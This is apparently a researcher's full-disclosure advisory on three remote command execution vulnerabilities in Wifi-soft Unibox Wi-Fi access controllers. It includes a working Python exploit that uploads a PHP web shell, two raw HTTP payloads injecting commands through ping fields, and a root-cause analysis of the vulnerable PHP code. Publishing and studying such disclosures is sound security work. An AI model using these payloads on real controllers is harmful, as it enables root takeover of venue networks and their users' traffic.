---
layout: post
title:  "Unibox Wifi Access Controller - Multiple Remote Command Execution Vulnerabilities"
tagline: Wifi-soft Unibox Controller Vulnerability Report
tag: advisory
excerpt_separator: <!--more-->

---

In this post, I will be disclosing POCs for multiple Remote Command & Code injection vulnerabilities found in Wifi-soft's Unibox Controllers. The vulnerabilities allows an attacker to gain root privileges on the system and affects all versions of Wifi-soft's Unibox Controllers. As there was no response from Wifi-soft team with-in and after 90 days disclosure timeline, I am going with full disclosure. So that people using these devices know the risk they are putting their infrastructure upto.<!--more-->
Following map shows the approximate number of devices affected globally:

![map](/assets/images/unibox/map.png)

### **Product Description**
[Unibox Controller][0] is a fast-paced, reliable and scalable network controller for all Large & Small venues. It can be installed in any public venue like hotels, cafes, schools/colleges, hospitals, shopping malls, travel venues and even private offices to control, manage and monitor Internet access.

It is designed to work with access points from any vendor and is extremely easy to configure and deploy in the network. It comes in different models ranging from 50 to 5,000 concurrent users so it can be deployed to manage a network of any scale. UniBox works seamlessly with UniMax access points making it really easy to deploy and manage these access points centrally from a single console.

### **Affected Versions**
 - Unibox Wifi Access Controller 0.x - 3.x

### **Vulnerable Instances:**

#### Unibox 0.x - 2.x 

* /network/mesh/edit-nds.php, **[POST] file CVE-2019-3495**
* /tools/ping **[POST] address CVE-2019-3497**

#### Unibox 3.x
* /tools/controller/diagnostic_tools_controller, **[POST] pingIPAddress CVE-2019-3496**

### **Proof of Concept:**

**Note:** *All session IDs and cookies are omitted to limit the damage, any credentials required to exploit the mention vulnerabilities are hardcoded and can be obtained without any sort of authentication as well (O yea, more vulns are still there and yes they have default admin credentials). If product owners are reading this and are concerned about the credibility of POCs, you can put a comment here and I can share the exploit with credentials, but I don't think that would be required anyway.*


> CVE-2019-3495.py

```python
#!/usr/bin/env python
# Exploit Author: Sahil Dhar (Twitter: @0x401)
# Desc: Unibox 2.x Remote Command Execution via Arbitrary file upload Exploit

import requests
import sys
import argparse
import os
import re
import string

from random import sample, randint

filename = ''.join(sample(string.ascii_letters, randint(5,15)))+'.php'

def gen_stagers():
	payload = "<?php echo shell_exec(\"sudo /usr/local/unibox-0.9/scripts/exeCommand.sh '\".$_REQUEST['c'].\"'\"); ?>"
	return payload


def exploit(rhost):
	cookie = {'user': 'unibox', 'pass':'md5(hardcoded_value)'}	
	multipart_data = {
		'sent': (None,'Save Page or Upload File'),
		'file' : (filename,"%s" %(gen_stagers())),
		'contents': (None,'<h1>Welcome to my network</h1>\n<a href="$authtarget">Login to my network!</a>')
	}
	headers = {
	'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'Accept-Language': 'en-GB,en;q=0.5'

	}
	url = "http://%s/network/mesh/edit-nds.php" %(rhost)
	response = requests.post(url,
					files=multipart_data,
					verify=False,
					cookies=cookie,
					headers=headers,
					proxies=proxies
				)
	data = response.text
	payload =  re.findall(r'<sc.*>.*\:\\n(.*?)\"\);<\/sc.*>',data)[0]
	print "[I] Payload Url \nUrl: %s\n" %(payload)
	response = requests.get(payload+'?c=id')
	print response.text	
	print "[I] Done"

if __name__=='__main__':
	print 'Unibox 2.x Remote Command Execution via Arbitrary file upload\n'
	if len(sys.argv) < 1:
		print 'Missing rhost'
		os._exit(1)
	exploit(sys.argv[1])
```
![poc_2](/assets/images/unibox/2.png)


> POC - CVE-2019-3497

```markdown
POST /tools/ping HTTP/1.1
Host: unibox_0.x_2.x
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 86
Cookie: PHPSESSID=<obtained_via_hardcoded_credentials>
Connection: close
Upgrade-Insecure-Requests: 1

pingaction=1&address=127.0.0.1%0asudo /usr/local/unibox-0.9/scripts/exeCommand.sh%20id
```

![poc_1](/assets/images/unibox/1.png)


> POC - CVE-2019-3496

```markdown
POST /tools/controller/diagnostic_tools_controller HTTP/1.1
Host: unibox_3.x
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Cookie: PHPSESSID=<obtained_via_hardcoded_credentials>
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 87

action=ping&pingIPAddress=127.0.0.1%0asudo /usr/local/unibox/scripts/exeCommand.sh%20id
```

![poc_3](/assets/images/unibox/3.png)

[0]: http://wifi-soft.com/unibox-controller/

### **Root Cause Analysis**
Though the vulnerabilities discussed above are pretty straigh forward to exploit using Blackbox testing approach, but having a look at the code can open a whole new world of learning and developer mindset to us. 

> CVE-2019-3495 - Unibox 0.x-2.x
>> network/mesh/edit-nds.php:57

```php
if ($_POST['sent'] && $_FILES['file']['name']) {

  // Person was using advanced mode, and posted a file to us

  $target_path = $dir . "data/uploads/" . $_COOKIE['user'] . "/" . basename($_FILES['file']['name']);
  if (move_uploaded_file($_FILES['file']['tmp_name'], $target_path)) {
    echo "<script>alert(\"Your file, " . basename($_FILES['file']['name']) . ", has been uploaded to:\\nhttp://" . $_SERVER['HTTP_HOST'] . str_replace("edit-nds.php", "", $_SERVER['REQUEST_URI']) . "data/uploads/" . $_COOKIE['user'] . "/" . basename($_FILES['file']['name']) . "\");</script>";
  }
  else {
    echo "<script>alert(\"There was an error uploading your file, please try again later.\");</script>";
  }
}
```
By looking at the code, one can learn two things first a vulnerable file upload function, second developer's assumption that these files cannot accessed by web GUI (oh yea they are not accessible when following the data flow process in web GUI and a feature denied/ not accessible message is shown). 

We can conclude the reason why they are allowing any file to be uploaded by looking at the comment `Person was using advanced mode, and posted a file to us` and realize that they are allowing some "advanced users" to upload any files. Well there are no Advanced users but hardcoded credentials which also does not validate Admin user's authentication.


> CVE-2019-3496 - Unibox 3.x
>> tools/controller/diagnostic_tools_controller.php:45

```php
if($action == 'ping') {
	#create object
	$toolsObject = new DiagonosticTools();

	#All validations
	$tracerouteAddress = trim($_REQUEST['pingIPAddress']);
	$errPingAddress = Utils::checkNotEmpty($tracerouteAddress, "IP Address/Domain Name");

	if($errPingAddress == "") {
		$errPingAddress = Utils::checkIPAddress($tracerouteAddress);
		if($errPingAddress == "") {
			$response = $toolsObject->testPing($tracerouteAddress);
		}
		else {
			$errPingAddress = Utils::checkDomainName($tracerouteAddress);
			if($errPingAddress == "") {
				$response = $toolsObject->testPing($tracerouteAddress);			
			}	
			else {
				$response['control']['status'] = -1;
				$response['err']['errPingAddress'] = $errPingAddress;
			}
		}
	}
	else {
		$response['control']['status'] = -1;
		$response['err']['errPingAddress'] = $errPingAddress;
	}
}
```
By looking the code of `diagnostic_tools_controller` responsible for executing `ping` command, we can see that the developer assumes that `trim()` function will strip down the special characters listed in php's trim documentation. 

![](/assets/images/unibox/4.png)

Well, it does strip down the characters but that only from the begining and end of the string. 

Actual Working:

* `cmd = localhost%0aid` - will work
* `cmd = "localhost;id` - will work 

Developer Assumption:

* `cmd = localhost%0atest` will return `localhosttest` - wrong 

As the entire string which PHP see is `localhost%0atest` and not just `localhost` and thus any command concatenated to `$_REQUEST['pingIPAddress']` along with general bash seperators will work just fine, putting `trim()` to no use. The `$_REQUEST['pingIPAddress']` is then passed to `$toolsObject->testPing()` function of `DiagonosticTools` class. 

> tools/model/diagnostic_tools_model.php:53

```php

public function testPing($pingAddress) {
	$response = array();

	shell_exec("/usr/bin/killall ping 2>>/dev/null >>/dev/null");
	$result = shell_exec("/bin/ping -c 3 -W 3 $pingAddress 2>&1 &");`
	if(strstr($result,'ping: unknown host')) {
		$response['data']['pingOutput'] = $result;
		$response['control']['status'] = 0;
	}
	else {
		$response['data']['pingOutput'] = str_replace("\n", "<br>", $result);
		$response['control']['status'] = 1;
		Utils::eventLogs("log","Tools","Ping","ping requested, to url: $pingAddress");
	}
	return $response;
}
```
 The code for `DiagonosticTools::testPing()` is pretty straighforward which simply concatenates the userinput `$_REQUEST['pingIPAddress']` to the `ping` command and executes via PHP's `shell_exec()` function, which also gives an advantages to the attacker to use shell features if required.

> CVE-2019-3497 - Unibox 0.x - 2.x
>> tools/ping.php

```php
$pingCount = 3;
$pingaction = $_REQUEST['pingaction'];
$address = (trim($_REQUEST['address']));

if ($_REQUEST['address']) {
  shell_exec("/usr/bin/killall ping 2>>/dev/null >>/dev/null");
  /* log event */
  $logPingAddress = $_REQUEST['address'];
  $eventSeverity = "log";
  $eventMessage = "ping requested, to url: $logPingAddress";
  logevent($eventSeverity, $eventMessage);
  /* event logging complete */
  $response = shell_exec("/bin/ping -c $pingCount -W 3 $address 2>&1 &");
  if (strstr($response, 'ping: unknown host')) {
    $response = "ping failed.";
  }
  else {
    $response = str_replace("\n", "<br />", $response);
  }
} 
```

After looking at the code of Unibox 3.x and 2.x devices, one can realize that the origin of remote command injection vulnerability is from mistakes of the past, where developer didn't realize the actual use of PHP's `trim()` function and kept on using it even after doing the complete code revamp for Unibox 3.x devices.


### **Timeline**

|Date|Status|
|:---|:---|
|4-OCT-2018|Reported to vendor|
|31-NOV-2018|Sent another email, but no response from vendor|
|5-JAN-2019|Public disclosure|